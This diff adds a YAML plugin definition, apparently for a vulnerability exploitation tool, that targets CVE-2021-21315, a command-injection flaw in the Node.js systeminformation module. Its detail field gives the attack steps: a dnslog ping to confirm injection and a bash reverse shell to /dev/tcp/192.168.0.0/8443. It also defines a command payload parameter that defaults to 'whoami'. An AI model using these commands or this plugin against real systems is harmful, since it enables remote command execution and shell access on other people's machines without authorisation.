@@ -1,0 +1,23 @@
+info:
+    app: Node
+    name: cve_2021_21315
+    author: 凉风
+    plugin_version: 1.0.0
+    disclosure_date: "2022-05-22"
+    create_date: "2024-10-06 08:12:51"
+    update_date: "2024-10-06 08:12:51"
+    scope: systeminformation < 5.3.1
+    description: Node.js-systeminformation是用于获取各种系统信息的Node.js模块,在存在命令注入漏洞的版本中，攻击者可以通过未过滤的参数中注入payload执行系统命令。
+    vul_id: CVE-2021-21315
+    detail: "1, 使用dnslog判断\nping -c 1 xxx.dnslog.cn \n2,反弹shell \nbash -i >& /dev/tcp/192.168.0.0/8443 0>&1"
+    reference: http://wiki.cisp-pte.com/#/wiki
+    vul_type: 命令执行
+payloads:
+    - name: cmd1
+      alias: 命令执行
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
